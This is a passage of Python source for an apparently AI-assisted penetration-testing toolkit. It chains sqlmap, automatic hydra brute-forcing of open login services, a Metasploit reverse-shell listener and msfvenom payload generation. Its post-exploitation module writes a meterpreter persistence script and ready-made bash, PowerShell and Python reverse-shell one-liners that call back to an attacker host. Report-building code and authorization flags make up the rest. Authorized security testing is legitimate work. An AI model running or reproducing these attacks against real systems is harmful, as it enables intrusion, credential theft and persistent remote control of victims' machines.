# Module 5 - Exploitation
# ---------------------------------------------------------------------------


class ExploitModule:
    def __init__(self, r: Runner, t: Target, cfg: Dict[str, Any],
                 interactive: bool, auto_attack: bool = True, threads: int = 16):
        self.r, self.t, self.cfg = r, t, cfg
        self.interactive = interactive
        self.auto_attack = auto_attack
        self.threads = threads

    def _sqlmap(self) -> None:
        if not self.r.check("sqlmap"):
            return
        if self.t.query:
            target = self.t.full_url
            extra = []
        elif self.t.base:
            if self.interactive:
                ans = input("  sqlmap: no URL params - crawl+forms instead? [y/N] > ").strip().lower()
                if ans not in ("y", "yes"):
                    log.info("sqlmap skipped")
                    return
            target = self.t.base
            extra = ["--forms", "--crawl", "1"]
        else:
            log.warning("sqlmap needs a URL - skipping")
            return
        outdir = str(self.r.outdir / "exploit" / "sqlmap")
        self.r.run(["sqlmap", "-u", target, "--batch", "--random-agent",
                    "--level", "1", "--risk", "1",
                    "--output-dir", outdir] + extra,
                   timeout=3600, phase="exploit", name="sqlmap")

    def _hydra_manual(self) -> None:
        if not self.r.check("hydra"):
            return
        wl = self.cfg["wordlists"]
        if self.interactive:
            service = input(f"  hydra service [default ssh] > ").strip() or "ssh"
            users = input(f"  users list [default {wl['users']}] > ").strip() or wl["users"]
            passes = input(f"  passwords list [default {wl['pass']}] > ").strip() or wl["pass"]
        else:
            service = self.cfg.get("hydra_service", "ssh")
            users, passes = wl["users"], wl["pass"]
        if not (wordlist_exists(self.r, users) and wordlist_exists(self.r, passes)):
            log.warning(f"wordlists missing ({users} / {passes}) - skipping hydra")
            return
        out = str(self.r.outdir / "exploit" / "hydra.txt")
        self.r.run(["hydra", "-L", users, "-P", passes,
                    "-t", str(self.threads), "-o", out, self.t.host, service],
                   timeout=3600, phase="exploit", name="hydra")

    def _auto_attack(self) -> None:
        if not self.r.check("hydra"):
            return
        ports = load_open_ports(self.r)
        if not ports:
            log.info("auto-attack: no open_ports.json yet - run Port Scan (2) first")
            return
        wl = self.cfg["wordlists"]
        if not (wordlist_exists(self.r, wl["users"]) and wordlist_exists(self.r, wl["pass"])):
            log.warning(f"auto-attack: wordlists missing ({wl['users']} / {wl['pass']})")
            return
        seen: List[Tuple[str, int]] = []
        for p in ports:
            svc = AUTOSERVICES.get(p["service"])
            if svc and (svc, p["port"]) not in seen:
                seen.append((svc, p["port"]))
        if not seen:
            log.info("auto-attack: no brute-forceable login services detected")
            return
        log.warning(f"auto-attack: hydra on {', '.join(f'{s} ({pt})' for s, pt in seen)}")
        for svc, pt in seen:
            out = str(self.r.outdir / "exploit" / f"hydra_{svc}_{pt}.txt")
            self.r.run(["hydra", "-L", wl["users"], "-P", wl["pass"],
                        "-t", str(self.threads), "-o", out,
                        self.t.host, "-s", str(pt), svc],
                       timeout=7200, phase="exploit", name=f"hydra_{svc}_{pt}")

    def _metasploit(self) -> None:
        if not self.r.check("msfconsole"):
            return
        msf = self.cfg["msf"]
        if self.interactive:
            lhost = input(f"  msf LHOST [default {msf['lhost']}] > ").strip()
            if lhost:
                msf["lhost"] = lhost
            lport = input(f"  msf LPORT [default {msf['lport']}] > ").strip()
            if lport:
                msf["lport"] = int(lport)
        rc = self.r.write("exploit", "msf_handler", (
            f"# generated by EIK v{__version__} {datetime.datetime.utcnow().isoformat()}\n"
            "use exploit/multi/handler\n"
            f"set PAYLOAD {msf['payload']}\n"
            f"set LHOST {msf['lhost']}\n"
            f"set LPORT {msf['lport']}\n"
            "set ExitOnSession false\n"
            "run -j\n"), "rc")
        logfile = self.r.outdir / "exploit" / "msf_listener.log"
        pid = self.r.background(["msfconsole", "-q", "-r", str(rc)], logfile)
        if pid and pid > 0:
            log.info(f"Metasploit listener running in background (pid {pid})")
            log.info(f"  log: {logfile}")
            log.info(f"  stop: kill {pid}  (or: pkill -f msfconsole)")

    def _advanced_exploit(self) -> None:
        """Run comprehensive advanced exploitation test suite (100+ vulnerability vectors)"""
        if not HAVE_ADVANCED_EXPLOIT:
            log.warning("advanced exploitation module not available")
            return
        
        if not self.t.base:
            log.warning("advanced exploit requires a URL - skipping")
            return
        
        if self.interactive:
            ans = input("  Run comprehensive advanced exploitation suite (100+ vectors)? [y/N] > ").strip().lower()
            if ans not in ("y", "yes"):
                log.info("advanced exploit skipped")
                return
        
        try:
            # Try v2 (100+ vectors) first, fallback to v1 (10 categories)
            try:
                from exploit_extensions_v2 import ComprehensiveExploitationCoordinator
                coordinator = ComprehensiveExploitationCoordinator(self.t.base, self.r.outdir)
                coordinator.run_all()
            except ImportError:
                from exploit_extensions import MasterExploitationModule
                coordinator = MasterExploitationModule(self.t.base, self.r.outdir)
                coordinator.run_all()
        except Exception as e:
            log.error(f"advanced exploitation failed: {e}")

    def run(self) -> None:
        log.info("=== [5/7] EXPLOITATION ===")
        self._sqlmap()
        self._hydra_manual()
        if self.auto_attack:
            self._auto_attack()
        self._metasploit()
        self._advanced_exploit()

# ---------------------------------------------------------------------------
# Module 6 - Post-Exploitation
# ---------------------------------------------------------------------------


class PostModule:
    def __init__(self, r: Runner, t: Target, cfg: Dict[str, Any]):
        self.r, self.t, self.cfg = r, t, cfg

    def _payloads(self) -> None:
        if not self.r.check("msfvenom"):
            return
        msf = self.cfg["msf"]
        for frmt, fname in (("elf", "payload_linux.elf"), ("exe", "payload_windows.exe")):
            out = self.r.outdir / "post" / fname
            self.r.run(["msfvenom", "-p", msf["payload"], "-f", frmt,
                        f"LHOST={msf['lhost']}", f"LPORT={msf['lport']}",
                        "-o", str(out)], timeout=120, phase="post", name=f"msfvenom_{frmt}")
            if out.exists():
                log.info(f"payload: {out} ({out.stat().st_size} bytes)")

    def _persistence(self) -> None:
        msf = self.cfg["msf"]
        p = self.r.write("post", "persistence", (
            "# meterpreter persistence template - lab use only; document removal\n"
            "run post/multi/manage/autoroute\n"
            f"run persistence -X -i 300 -p {msf['lport']} -r {msf['lhost']}\n"), "rc")
        log.info(f"persistence resource script -> {p}")

    def _listener_notes(self) -> None:
        lport = self.cfg["msf"]["lport"]
        txt = f"""# ncat listener (run manually when expecting a callback):
ncat -lvnp {lport}

# Linux reverse shell:
bash -i >& /dev/tcp/LHOST/{lport} 0>&1

# Windows PowerShell reverse shell:
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(($r+'> '),[Text.Encoding]::ASCII.GetBytes($r+'> ').Length,([Text.Encoding]::ASCII.GetBytes($r+'> ').Length-($r+'> ').Length);$s.Flush()}};$c.Close()"

# Python one-liner:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
"""
        p = self.r.write("post", "listener_notes", txt, "txt")
        log.info(f"listener cheat-sheet -> {p}")

    def run(self) -> None:
        log.info("=== [6/7] POST-EXPLOITATION ===")
        self._payloads()
        self._persistence()
        self._listener_notes()

# ---------------------------------------------------------------------------
# Module 7 - Report
# ---------------------------------------------------------------------------


@dataclass
class Finding:
    title: str
    severity: str
    cvss: float = 0.0
    description: str = ""
    evidence: str = ""
    remediation: str = ""


class ReportModule:
    def __init__(self, r: Runner, t: Target, baseline: Optional[Path] = None,
                 sarif: bool = False):
        self.r, self.t = r, t
        self.findings: List[Finding] = []
        self.baseline = baseline
        self.sarif = sarif

    @staticmethod
    def _fingerprint(finding: Finding) -> str:
        # Evidence is intentionally included: identical template names on two
        # different paths are distinct issues for remediation and CI tracking.
        raw = "\x1f".join((finding.title, finding.severity, finding.evidence)).lower()
        return hashlib.sha256(raw.encode("utf-8")).hexdigest()[:16]

    def _deduplicate(self) -> None:
        unique: Dict[str, Finding] = {}
        for finding in self.findings:
            key = self._fingerprint(finding)
            if key not in unique:
                unique[key] = finding
        removed = len(self.findings) - len(unique)
        self.findings = list(unique.values())
        if removed:
            log.info(f"report: removed {removed} duplicate finding(s)")

    def _summary(self) -> Dict[str, Any]:
        counts = {s: sum(1 for f in self.findings if f.severity == s) for s in SEV_ORDER}
        return {
            "schema_version": "1.0",
            "target": self.t.raw,
            "generated_at": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "total_findings": len(self.findings),
            "severity_counts": {key.lower(): value for key, value in counts.items()},
            "findings": [{**asdict(f), "fingerprint": self._fingerprint(f)} for f in self.findings],
        }

    def _baseline_delta(self) -> Dict[str, Any]:
        if not self.baseline:
            return {"baseline": None, "new": [], "resolved": []}
        try:
            source = json.loads(self.baseline.read_text(encoding="utf-8"))
            previous = source.get("findings", source) if isinstance(source, dict) else source
            old = {str(item.get("fingerprint") or self._fingerprint(Finding(**{
                       key: value for key, value in item.items() if key != "fingerprint"})))
                   for item in previous if isinstance(item, dict)}
        except (OSError, json.JSONDecodeError, TypeError, ValueError) as exc:
            log.warning(f"could not read baseline {self.baseline}: {exc}")
            return {"baseline": str(self.baseline), "new": [], "resolved": []}
        current = {self._fingerprint(f) for f in self.findings}
        return {"baseline": str(self.baseline), "new": sorted(current - old),
                "resolved": sorted(old - current)}

    def _write_sarif(self) -> Path:
        rules: Dict[str, Dict[str, Any]] = {}
        results = []
        for f in self.findings:
            rule_id = "EIK-" + self._fingerprint(f)
            rules[rule_id] = {"id": rule_id, "name": f.title,
                              "shortDescription": {"text": f.title},
                              "help": {"text": f.remediation or "Review and remediate this finding."}}
            results.append({"ruleId": rule_id,
                            "level": {"Critical": "error", "High": "error", "Medium": "warning"}.get(f.severity, "note"),
                            "message": {"text": f.description or f.title},
                            "properties": {"severity": f.severity, "cvss": f.cvss,
                                           "evidence": f.evidence, "fingerprint": self._fingerprint(f)}})
        document = {"$schema": "https://json.schemastore.org/sarif-2.1.0.json",
                    "version": "2.1.0", "runs": [{"tool": {"driver": {"name": PROG,
                    "version": __version__, "rules": list(rules.values())}}, "results": results}]}
        return self.r.write("report", "eik", json.dumps(document, indent=2), "sarif")

    def _from_nmap(self) -> None:
        path = self.r.outdir / "scan" / "nmap_scan.xml"
        if not path.exists():
            return
        try:
            root = ET.parse(str(path)).getroot()
        except ET.ParseError:
            return
        for host in root.findall(".//host"):
            addr = host.find("address")
            ip = addr.get("addr", "?") if addr is not None else "?"
            for port in host.findall(".//port"):
                st = port.find("state")
                if st is None or st.get("state") != "open":
                    continue
                svc = port.find("service")
                name = svc.get("name", "unknown") if svc is not None else "unknown"
                prod = svc.get("product", "") if svc is not None else ""
                ver = svc.get("version", "") if svc is not None else ""
                pid = port.get("portid", "?")
                self.findings.append(Finding(
                    title=f"Open port {pid}/{port.get('protocol','tcp')} - {name}",
                    severity="Info",
                    description=f"Service '{name}' exposed on {ip}:{pid}.",
                    evidence=f"{ip}:{pid} - {name} {prod} {ver}".strip(),
                    remediation="Restrict exposure via firewall; patch the service.",
                ))

    def _from_nikto(self) -> None:
        path = self.r.outdir / "web" / "nikto.json"
        if not path.exists():
            return
        try:
            data = json.loads(path.read_text())
        except (json.JSONDecodeError, OSError):
            return
        for v in data.get("vulnerabilities", []) if isinstance(data, dict) else []:
            msg = v.get("message") or v.get("msg") or str(v)
            self.findings.append(Finding(
                title="Nikto web check", severity="Medium", description=msg,
                evidence=f"URL: {v.get('url', self.t.base)}",
                remediation="Review flagged headers/config against OWASP ASVS.",
            ))

    def _from_http_baseline(self) -> None:
        path = self.r.outdir / "web" / "http_baseline.json"
        if not path.exists():
            return
        try:
            data = json.loads(path.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError):
            return
        for item in data.get("findings", []) if isinstance(data, dict) else []:
            if not isinstance(item, dict):
                continue
            severity = str(item.get("severity", "Info")).capitalize()
            self.findings.append(Finding(title=str(item.get("title", "HTTP hardening check")),
                severity=severity if severity in SEV_ORDER else "Info",
                description=str(item.get("description", "")), evidence=str(item.get("evidence", "")),
                remediation=str(item.get("remediation", ""))))

    def _from_nuclei(self) -> None:
        path = self.r.outdir / "web" / "nuclei.jsonl"
        if not path.exists():
            return
        for line in path.read_text().splitlines():
            try:
                item = json.loads(line)
            except json.JSONDecodeError:
                continue
            info = item.get("info", {})
            sev = str(info.get("severity", "info")).capitalize()
            if sev not in SEV_ORDER:
                sev = "Info"
            self.findings.append(Finding(
                title=info.get("name", item.get("template-id", "nuclei hit")),
                severity=sev,
                description=f"Nuclei template {item.get('template-id')} matched.",
                evidence=item.get("matched-at", ""),
                remediation="Validate and remediate per template guidance.",
            ))

    def _from_whatweb(self) -> None:
        path = self.r.outdir / "web" / "whatweb.json"
        if not path.exists():
            return
        try:
            data = json.loads(path.read_text())
        except (json.JSONDecodeError, OSError):
            return
        for target in data if isinstance(data, list) else []:
            plugins = list(target.get("plugins", {}).keys())
            if plugins:
                self.findings.append(Finding(
                    title="Web technology fingerprint",
                    severity="Info",
                    description="Detected stack: " + ", ".join(plugins[:12]),
                    evidence=target.get("target", self.t.base),
                    remediation="Remove unused components; patch versions against CVEs.",
                ))

    def _from_wpscan(self) -> None:
        path = self.r.outdir / "web" / "wpscan.json"
        if not path.exists():
            return
        try:
            data = json.loads(path.read_text())
        except (json.JSONDecodeError, OSError):
            return
        for v in data.get("vulnerabilities", []) or []:
            self.findings.append(Finding(
                title=f"WordPress vuln: {v.get('title', 'unknown')}",
                severity="High",
                description=v.get("description", ""),
                evidence=str(v.get("references", {}))[:300],
                remediation="Update the affected WordPress component.",
            ))

    def _from_ffuf_gobuster(self) -> None:
        gob = self.r.outdir / "web" / "gobuster.txt"
        ff = self.r.outdir / "web" / "ffuf.json"
        hits = []
        if gob.exists():
            for line in gob.read_text().splitlines():
                m = re.match(r"(\d{3})\s+(\S+)", line)
                if m and int(m.group(1)) < 400:
                    hits.append(f"{m.group(2)} [{m.group(1)}]")
        if ff.exists():
            try:
                for res in json.loads(ff.read_text()).get("results", []):
                    if int(res.get("status", 0)) < 400:
                        hits.append(f"{res.get('url')} [{res.get('status')}]")
            except (json.JSONDecodeError, OSError):
                pass
        if hits:
            self.findings.append(Finding(
                title="Interesting web paths discovered",
                severity="Info",
                description="Directory brute-force hits (status < 400).",
                evidence="\n".join(hits[:20]),
                remediation="Review each path for exposed functionality/data.",
            ))

    def _from_hydra(self) -> None:
        for path in sorted(self.r.outdir.glob("exploit/hydra*.txt")):
            if not path.exists():
                continue
            for line in path.read_text().splitlines():
                if "login:" in line:
                    self.findings.append(Finding(
                        title="Valid credentials found (hydra)",
                        severity="Critical",
                        description=f"Online brute-force recovered credentials via {path.name}.",
                        evidence=line.strip(),
                        remediation="Rotate credentials; enforce MFA and lockout policies.",
                    ))

    def _manual(self) -> None:
        path = self.r.outdir / "findings.json"
        if not path.exists():
            return
        try:
            for item in json.loads(path.read_text()):
                self.findings.append(Finding(**item))
        except (json.JSONDecodeError, OSError, TypeError):
            log.warning(f"could not parse manual findings: {path}")

    def _write_md(self) -> Path:
        lines = [
            f"# EIK Penetration Test Report - {self.t.host}",
            "",
            f"**Tool:** EIK (Ethical Intelligence Toolkit) v{__version__}",
            f"**Founder:** {FOUNDER}",
            f"**Date:** {datetime.date.today().isoformat()}",
            f"**Target:** {self.t.raw}",
            "**Methodology:** 5-phase, PTES-inspired",
            "",
            "## Executive Summary", "",
        ]
        counts = {s: sum(1 for f in self.findings if f.severity == s) for s in SEV_ORDER}
        lines.append(f"{len(self.findings)} finding(s): {counts['Critical']} critical, "
                     f"{counts['High']} high, {counts['Medium']} medium, "
                     f"{counts['Low']} low, {counts['Info']} info.\n")
        lines.append("## Findings\n")
        for f in sorted(self.findings, key=lambda x: -SEV_ORDER[x.severity]):
            lines += [f"### [{f.severity}] {f.title}", "",
                      f"- **CVSS:** {f.cvss or 'n/a'}",
                      f"- **Description:** {f.description}",
                      f"- **Evidence:** `{f.evidence}`",
                      f"- **Remediation:** {f.remediation}", ""]
        p = self.r.outdir / "report" / "report.md"
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text("\n".join(lines), encoding="utf-8")
        return p

    def _write_pdf(self) -> Optional[Path]:
        try:
            from reportlab.lib.pagesizes import A4
            from reportlab.lib.styles import getSampleStyleSheet
            from reportlab.lib import colors
            from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer,
                                            Table, TableStyle)
        except ImportError:
            log.warning("reportlab not installed - PDF skipped (pip install reportlab)")
            return None
        styles = getSampleStyleSheet()
        story = [Paragraph(f"EIK Penetration Test Report - {self.t.host}", styles["Title"]),
                 Spacer(1, 12),
                 Paragraph(f"EIK (Ethical Intelligence Toolkit) v{__version__} | "
                           f"Founder: {FOUNDER}", styles["Normal"]),
                 Paragraph(f"Date: {datetime.date.today().isoformat()} | Target: {self.t.raw}",
                           styles["Normal"]),
                 Spacer(1, 18),
                 Paragraph("Executive Summary", styles["Heading1"]),
                 Paragraph(f"{len(self.findings)} finding(s) identified.", styles["Normal"]),
                 Spacer(1, 18),
                 Paragraph("Findings", styles["Heading1"])]
        rows = [["Severity", "Title", "CVSS", "Remediation"]]
        for f in sorted(self.findings, key=lambda x: -SEV_ORDER[x.severity]):
            rows.append([f.severity, f.title, str(f.cvss or "n/a"), f.remediation])
        tbl = Table(rows, colWidths=[55, 200, 40, 230])
        tbl.setStyle(TableStyle([
            ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#1f2937")),
            ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
            ("GRID", (0, 0), (-1, -1), 0.5, colors.grey),
            ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ]))
        story.append(tbl)
        for f in sorted(self.findings, key=lambda x: -SEV_ORDER[x.severity]):
            story.append(Spacer(1, 10))
            story.append(Paragraph(f"[{f.severity}] {f.title}", styles["Heading3"]))
            story.append(Paragraph(f"<b>Description:</b> {f.description}", styles["Normal"]))
            story.append(Paragraph(f"<b>Evidence:</b> <font face='Courier'>{f.evidence}</font>",
                                  styles["Normal"]))
            story.append(Paragraph(f"<b>Remediation:</b> {f.remediation}", styles["Normal"]))
        story.append(Spacer(1, 24))
        story.append(Paragraph(f"<i>Generated by EIK v{__version__} - {FOUNDER}</i>",
                               styles["Normal"]))
        p = self.r.outdir / "report" / "report.pdf"
        p.parent.mkdir(parents=True, exist_ok=True)
        SimpleDocTemplate(str(p), pagesize=A4).build(story)
        return p

    def run(self) -> None:
        log.info("=== [7/7] ANALYSIS & REPORTING ===")
        self._from_nmap()
        self._from_http_baseline()
        self._from_nikto()
        self._from_nuclei()
        self._from_whatweb()
        self._from_wpscan()
        self._from_ffuf_gobuster()
        self._from_hydra()
        self._manual()
        self._deduplicate()
        summary = self._summary()
        summary["baseline_delta"] = self._baseline_delta()
        self.r.save("report", "findings", summary["findings"])
        self.r.save("report", "summary", summary)
        md = self._write_md()
        pdf = self._write_pdf()
        if self.sarif:
            log.info(f"report: {self._write_sarif()}")
        counts = {s: sum(1 for f in self.findings if f.severity == s) for s in SEV_ORDER}
        log.info(f"report: {md}")
        if pdf:
            log.info(f"report: {pdf}")
        log.info(f"findings: {len(self.findings)} total "
                 f"({counts['Critical']} critical, {counts['High']} high, "
                 f"{counts['Medium']} medium, {counts['Low']} low, {counts['Info']} info)")

# ---------------------------------------------------------------------------
# Menu / orchestration
# ---------------------------------------------------------------------------

MODULES: List[Tuple[int, str, str]] = [
    (1, "Reconnaissance",  "whois, dig, subfinder, dnsrecon, theHarvester, dorks, httpx"),
    (2, "Port Scan",       "masscan, nmap -sV -sC, sslscan (+ --script vuln)"),
    (3, "Web Scan",        "whatweb, nikto, nuclei, gobuster/ffuf, wpscan (auto)"),
    (4, "Service Enum",    "enum4linux, smbmap, netexec (SMB/WinRM), searchsploit"),
    (5, "Exploitation",    "sqlmap, hydra + AUTO-ATTACK, metasploit + COMPREHENSIVE v2.0 (100+ vectors across 10 categories)"),
    (6, "Post-Exploit",    "msfvenom payloads, persistence rc, ncat cheat-sheet"),
    (7, "Report",          "findings.json + report.md + report.pdf"),
    (8, "AI Hub",          "EvilGPT: phase briefings, full analysis, interactive chat"),
]

# Banner is now displayed using print_banner() function with ANSI color codes

def parse_choices(text: str) -> List[int]:
    text = text.strip().lower()
    if text in ("all", "a", "*"):
        return [m[0] for m in MODULES]
    choices: List[int] = []
    for part in re.split(r"[,\s]+", text):
        if not part:
            continue
        if "-" in part:
            a, _, b = part.partition("-")
            try:
                choices.extend(range(int(a), int(b) + 1))
            except ValueError:
                pass
        else:
            try:
                choices.append(int(part))
            except ValueError:
                continue
    return sorted(set(c for c in choices if 1 <= c <= len(MODULES)))


def print_modules() -> None:
    print(f"\n{BRIGHT_CYAN}┌─ {BRIGHT_GREEN}📋 SELECT MODULES{BRIGHT_CYAN} ─────────────────────────────────────────┐{RESET}")
    for mid, name, desc in MODULES:
        icon = ["🔍", "🔫", "🌐", "⚙️", "💣", "📤", "📊", "🤖"][mid - 1]
        print(f"{BRIGHT_CYAN}│{RESET} {BRIGHT_YELLOW}[{mid}]{RESET} {icon} {BRIGHT_GREEN}{name:20s}{RESET} {CYAN}→{RESET} {desc}")
    print(f"{BRIGHT_CYAN}└───────────────────────────────────────────────────────────────────────────────┘{RESET}")
    print("  e.g. '1,3,5'  or  'all'\n")


def doctor(r: Runner) -> None:
    have = [n for n in TOOL_INFO if r.have(n)]
    missing = [n for n in TOOL_INFO if not r.have(n)]
    print(f"  tools ready : {len(have)}   missing: {len(missing)}")
    if missing:
        apt = " ".join(sorted({TOOL_INFO[n]["apt"] for n in missing}))
        log.warning(f"install missing tools: sudo apt install -y {apt}")
    else:
        log.info("all tools present - full power mode")


def artifact_tree(root: Path) -> None:
    if not root.exists():
        return
    print(f"\n{BRIGHT_CYAN}┌─ {BRIGHT_GREEN}📁 ARTIFACTS{BRIGHT_CYAN} ──────────────────────────────────────────────┐{RESET}")
    print(f"{BRIGHT_CYAN}│{RESET} {BRIGHT_YELLOW}Location{RESET} {CYAN}→{RESET} {BRIGHT_GREEN}{root}{RESET}")
    print(f"{BRIGHT_CYAN}│{RESET}")
    for dirpath, dirnames, filenames in os.walk(root):
        rel = Path(dirpath).relative_to(root)
        depth = 0 if str(rel) == "." else len(rel.parts)
        folder_name = f"📂 {'/' + rel.name if str(rel) != '.' else ''}"
        print(f"{BRIGHT_CYAN}│{RESET} " + "  " * depth + f"{BRIGHT_GREEN}{folder_name}{RESET}")
        for fn in sorted(filenames):
            size = (Path(dirpath) / fn).stat().st_size
            file_icon = "📄" if fn.endswith(".json") else "📝" if fn.endswith(".md") else "📋" if fn.endswith(".txt") else "📊"
            print(f"{BRIGHT_CYAN}│{RESET} " + "  " * (depth + 1) + f"{file_icon} {CYAN}{fn}{RESET} {DIM}({size:,} B){RESET}")
    print(f"{BRIGHT_CYAN}└─────────────────────────────────────────────────────────────────────────────┘{RESET}")


def dashboard(t: Target, outdir: Path, elapsed: float, choices: List[int]) -> None:
    total_files = 0
    if outdir.exists():
        for _, _, fns in os.walk(outdir):
            total_files += len(fns)
    
    print(f"\n{BRIGHT_CYAN}╔═════════════════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BRIGHT_CYAN}║{RESET} {BRIGHT_GREEN}✓ EIK SESSION COMPLETE{RESET}")
    print(f"{BRIGHT_CYAN}╠═════════════════════════════════════════════════════════════════════════════════╣{RESET}")
    print(f"{BRIGHT_CYAN}║{RESET} {BRIGHT_YELLOW}Target{RESET}     {CYAN}→{RESET} {BRIGHT_GREEN}{t.raw}{RESET}")
    print(f"{BRIGHT_CYAN}║{RESET} {BRIGHT_YELLOW}Modules{RESET}    {CYAN}→{RESET} {BRIGHT_YELLOW}{', '.join(str(c) for c in choices)}{RESET}")
    print(f"{BRIGHT_CYAN}║{RESET} {BRIGHT_YELLOW}Time{RESET}       {CYAN}→{RESET} {BRIGHT_GREEN}{elapsed:.0f}s{RESET}")
    print(f"{BRIGHT_CYAN}║{RESET} {BRIGHT_YELLOW}Artifacts{RESET}  {CYAN}→{RESET} {BRIGHT_GREEN}{total_files}{RESET} files")
    
    rp = outdir / "report" / "findings.json"
    if rp.exists():
        try:
            data = json.loads(rp.read_text())
            c = Counter(str(f.get("severity", "Info")).capitalize() for f in data)
            
            # Color-coded severity display
            severity_display = []
            for k, v in sorted(c.items(), key=lambda x: -SEV_ORDER.get(x[0], 0)):
                if k == "Critical":
                    severity_display.append(f"{BRIGHT_RED}{k}={v}{RESET}")
                elif k == "High":
                    severity_display.append(f"{RED}{k}={v}{RESET}")
                elif k == "Medium":
                    severity_display.append(f"{YELLOW}{k}={v}{RESET}")
                elif k == "Low":
                    severity_display.append(f"{BLUE}{k}={v}{RESET}")
                else:
                    severity_display.append(f"{CYAN}{k}={v}{RESET}")
            
            findings_str = " ".join(severity_display)
            print(f"{BRIGHT_CYAN}║{RESET} {BRIGHT_YELLOW}Findings{RESET}   {CYAN}→{RESET} {len(data)} total ({findings_str})")
        except Exception:  # noqa: BLE001
            pass
    
    print(f"{BRIGHT_CYAN}║{RESET} {BRIGHT_YELLOW}Reports{RESET}    {CYAN}→{RESET} {BRIGHT_GREEN}{outdir}{RESET}")
    print(f"{BRIGHT_CYAN}╚═════════════════════════════════════════════════════════════════════════════════╝{RESET}\n")


def build_cfg(runner: Runner) -> Dict[str, Any]:
    wl = {
        "dir": "/usr/share/wordlists/dirb/common.txt",
        "users": "/usr/share/wordlists/metasploit/unix_users.txt",
        "pass": "/usr/share/wordlists/rockyou.txt",
    }
    if not wordlist_exists(runner, wl["pass"]):
        alt = "/usr/share/wordlists/rockyou.txt.gz"
        if Path(alt).exists():
            log.warning(f"{wl['pass']} is compressed - run: gunzip -k {alt}")
    return {"wordlists": wl,
            "msf": {"payload": "linux/x64/meterpreter/reverse_tcp",
                    "lhost": detect_lhost(), "lport": 4444}}


PHASE_NAMES = {1: "RECONNAISSANCE", 2: "PORT SCAN", 3: "WEB SCAN",
               4: "SERVICE ENUM", 5: "EXPLOITATION", 6: "POST-EXPLOIT",
               7: "REPORT"}


def run_selected(choices: List[int], t: Target, r: Runner, cfg: Dict[str, Any],
                 interactive: bool, parallel: bool, vuln: bool,
                 profile: str, auto_attack: bool, threads: int, baseline: Optional[Path],
                 sarif: bool,
                 ai: Optional[Any]) -> None:
    start = time.time()
    for mid in choices:
        if mid == 1:
            ReconModule(r, t).run()
        elif mid == 2:
            PortScanModule(r, t, vuln=vuln, profile=profile).run()
        elif mid == 3:
            WebScanModule(r, t, parallel=parallel).run()
        elif mid == 4:
            ServiceEnumModule(r, t).run()
        elif mid == 5:
            ExploitModule(r, t, cfg, interactive=interactive,
                          auto_attack=auto_attack, threads=threads).run()
        elif mid == 6:
            PostModule(r, t, cfg).run()
        elif mid == 7:
            ReportModule(r, t, baseline=baseline, sarif=sarif).run()
        elif mid == 8:
            if ai:
                log.info("=== [8/8] AI HUB (EvilGPT) ===")
                ai.final_brief(r.outdir)
                ai.report_summary(r.outdir)
            else:
                log.warning("AI hub unavailable - set GEMINI_API_KEY and ensure eik_ai.py is present")

        # EvilGPT briefs the user after every completed phase (all tool output -> AI)
        if ai and mid in PHASE_NAMES:
            try:
                ai.phase_brief(PHASE_NAMES[mid], r.outdir)
            except Exception as exc:  # noqa: BLE001
                log.warning(f"EvilGPT phase briefing failed: {exc}")

    elapsed = time.time() - start
    dashboard(t, r.outdir, elapsed, choices)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog=PROG,
        description=f"ETHICAL INTELLIGENCE TOOLKIT v3.0 - AI-POWERED PENETRATION TESTING SUITE\n"
                    f"100+ Vulnerability Vectors | 10 Major Categories | Enterprise-Grade Scanning\n"
                    f"Founder: {FOUNDER} | v{__version__} | AI core: EvilGPT (Gemini)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("-t", "--target", help="target URL or IP (skip to use interactive wizard)")
    p.add_argument("-m", "--modules", default="all",
                   help="modules to run, e.g. 1,3,5 or all (default: all)")
    p.add_argument("--assessment-profile", choices=("passive", "standard", "active"),
                   help="module preset: passive=1,7,8; standard=1,2,3,4,7,8; active=all")
    p.add_argument("--outdir", default="output", help="artifact output directory")
    p.add_argument("--authorized", action="store_true",
                   help="confirm you have written authorization for this target")
    p.add_argument("--engagement-id",
                   help="required self-chosen run label (e.g. my-site-2026); not a government ID")
    p.add_argument("--scope", metavar="FILE",
                   help="scope file: one allowed domain, URL, IP, or CIDR per line")
    p.add_argument("--allow-active", action="store_true",
                   help="allow modules 5/6 after authorization; they can affect the target")
    p.add_argument("--baseline", metavar="FILE",
                   help="previous report/findings JSON; records new and resolved findings")
    p.add_argument("--sarif", action="store_true",
                   help="write report/eik.sarif for GitHub, GitLab, and other CI systems")
    p.add_argument("--fail-on", choices=("critical", "high", "medium", "low"),
                   help="exit with code 3 when report contains this severity or higher")
    p.add_argument("--parallel", action="store_true", help="run independent scans concurrently")
    p.add_argument("--vuln", action="store_true", help="include slow nmap --script vuln pass")
    p.add_argument("--fast", action="store_true", help="fast scan profile (masscan 5000 pps)")
    p.add_argument("--stealth", action="store_true", help="stealth scan profile (T1, low rate)")
    p.add_argument("--no-auto-attack", action="store_true",
                   help="disable hydra auto-attack on open login services")
    p.add_argument("--threads", type=int, default=16, help="hydra threads (default 16)")
    p.add_argument("--hydra-service", default="ssh", help="hydra service (non-interactive)")
    p.add_argument("--lhost", help="LHOST for reverse payloads")
    p.add_argument("--lport", type=int, default=4444, help="LPORT for reverse payloads")
    p.add_argument("--no-ai", action="store_true",
                   help="disable the EvilGPT AI hub (tool-only mode)")
    p.add_argument("--ai-key", help="Gemini API key (or set GEMINI_API_KEY)")
    p.add_argument("--ai-model", default="gemini-2.0-flash", help="Gemini model name")
